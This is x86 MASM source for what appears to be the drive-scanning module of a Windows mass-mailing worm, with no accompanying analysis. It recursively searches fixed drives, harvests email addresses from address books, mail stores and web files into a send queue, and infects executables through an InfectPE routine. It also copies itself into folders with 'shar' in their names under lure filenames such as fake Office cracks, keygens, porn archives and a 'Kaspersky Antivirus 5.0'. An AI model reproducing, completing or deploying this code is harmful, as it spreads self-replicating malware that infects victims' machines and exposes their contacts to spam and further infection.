; Recursive filesystem scanner
; ----------------------------

.data
        szHDDSlash      db      "\",0
        szHDDSearchMask db      "*.*",0

        szScanExtension db      ".wab",0,".txt",0,".msg",0,".htm",0,".shtm",0,".stm",0,".xml",0,".dbx",0,".mbx",0,".mdx",0,".eml",0,".nch",0,".mmf",0,".ods",0,".cfg",0,".asp",0,".php",0,".pl",0
                        db      ".wsh",0,".adb",0,".tbb",0,".sht",0,".xls",0,".oft",0,".uin",0,".cgi",0,".mht",0,".dhtm",0,".jsp",0,0

        szShar          db      "shar",0

        IFDEF TESTVERSION
        szHDDBasePath   db      "C:\Emails\",0
        ENDIF

        szSharNames     db      "Microsoft Office 2003 Crack, Working!.exe",0
                        db      "Microsoft Windows XP, WinXP Crack, working Keygen.exe",0
                        db      "Microsoft Office XP working Crack, Keygen.exe",0
                        db      "Porno, sex, oral, anal cool, awesome!!.exe",0
                        db      "Porno Screensaver.scr",0
                        db      "Serials.txt.exe",0
                        db      "KAV 5.0",0
                        db      "Kaspersky Antivirus 5.0",0
                        db      "Porno pics arhive, xxx.exe",0
                        db      "Windows Sourcecode update.doc.exe",0
                        db      "Ahead Nero 7.exe",0
                        db      "Windown Longhorn Beta Leak.exe",0
                        db      "Opera 8 New!.exe",0
                        db      "XXX hardcore images.exe",0
                        db      "WinAmp 6 New!.exe",0
                        db      "WinAmp 5 Pro Keygen Crack Update.exe",0
                        db      "Adobe Photoshop 9 full.exe",0
                        db      "Matrix 3 Revolution English Subtitles.exe",0
                        db      "ACDSee 9.exe",0,0

.code

EmailAddToQueue proto :DWORD

HDDCopySelfToShares proc uses edi lpPath: DWORD
        LOCAL   adv_path: DWORD

        invoke  GlobalAlloc, GMEM_FIXED, 65000
        mov     adv_path, eax

        mov     edi, offset szSharNames
@next:
        push    edi
        invoke  lstrcpy, adv_path, lpPath
        push    adv_path
        call    lstrcat
        invoke  CopyFile, offset szSysDirFileName, adv_path, TRUE

        mNextListEntry @next

        invoke  GlobalFree, adv_path        
        ret
HDDCopySelfToShares endp

HDDProcessFile proc uses edi szFullFilePath: DWORD
        mov     edi, offset szScanExtension

@next:
        cld
        mov     edx, edi
        xor     eax, eax
        or      ecx, -1
        repnz scasb

        invoke  StrStrI, szFullFilePath, edx
        .IF     eax
                invoke  EmailScanFile, szFullFilePath, offset EmailAddToQueue
        .ELSE
                cmp     byte ptr[edi], 0
                jnz     @next
        .ENDIF

        IFNDEF  DisableInfect
                invoke  StrStrI, szFullFilePath, offset szExeExe
                .IF     eax
                        invoke  InfectPE, szFullFilePath
                .ENDIF
        ENDIF
        ret
HDDProcessFile endp

HDDScanFromPath proc uses edi lpPath, szBasePath: DWORD
        LOCAL   hFind: DWORD
        LOCAL   FindFileData: DWORD

        invoke  LocalAlloc, GPTR, sizeof WIN32_FIND_DATA
        mov     FindFileData, eax

        invoke  lstrlen, lpPath
        mov     edi, eax

        invoke  lstrcat, lpPath, offset szHDDSearchMask

        invoke  FindFirstFile, lpPath, FindFileData
        mov     hFind, eax
        inc     eax
        jz      @end

@find_loop:
        mov     eax, lpPath
        mov     byte ptr[eax + edi], 0

        mov     edx, FindFileData
        lea     edx, [edx].WIN32_FIND_DATA.cFileName

        cmp     word ptr[edx], '.'
        jz      @skip

        cmp     word ptr[edx], '..'
        jz      @skip

        invoke  lstrcat, lpPath, edx

        mov     edx, FindFileData
        lea     edx, [edx].WIN32_FIND_DATA.dwFileAttributes
        test    dword ptr[edx], FILE_ATTRIBUTE_DIRECTORY
        jz      @file

        ; Check if Directory name has "share" substr in it
        invoke  StrRChr, lpPath, NULL, '\'
        .IF     eax
                inc     eax
                invoke  StrStrI, eax, offset szShar
        .ENDIF
        push    eax
        ; Process Directory
        invoke  lstrcat, lpPath, offset szHDDSlash
        pop     eax
        .IF     eax
                invoke  HDDCopySelfToShares, lpPath
        .ENDIF
        invoke  HDDScanFromPath, lpPath, szBasePath
        jmp     @skip

@file:
        ; Process File
        invoke  HDDProcessFile, lpPath
        
@skip:
        invoke  Sleep, 2
        invoke  FindNextFile, hFind, FindFileData
        test    eax, eax
        jnz     @find_loop

        invoke  FindClose, hFind

@end:
        invoke  LocalFree, FindFileData

        ret
HDDScanFromPath endp

HDDScanDrive proc szDrive: DWORD
        LOCAL   szLongPath: DWORD

        invoke  GlobalAlloc, GPTR, 65536
        mov     szLongPath, eax
        invoke  lstrcpy, eax, szDrive

        .IF     eax
                invoke  HDDScanFromPath, szLongPath, szLongPath
        .ENDIF

        invoke  GlobalFree, szLongPath
        ret
HDDScanDrive endp

HDDScanDrives proc uses esi
        LOCAL   DrvBuf: DWORD
        invoke  GlobalAlloc, GPTR, 8192
        mov     DrvBuf, eax
        invoke  GetLogicalDriveStrings, 8191, eax
        mov     esi, DrvBuf

        IFDEF TESTVERSION
                invoke  HDDScanDrive, offset szHDDBasePath
        ELSE      
                @get_next_drv:
                .IF     byte ptr[esi]
                        invoke  GetDriveType, esi
                        .IF     eax == DRIVE_FIXED
                                invoke  HDDScanDrive, esi
                        .ENDIF
                        invoke  lstrlen, esi
                        add     esi, eax
                        inc     esi
                        jmp     @get_next_drv
                .ENDIF
        ENDIF

        invoke  GlobalFree, DrvBuf
        ret
HDDScanDrives endp
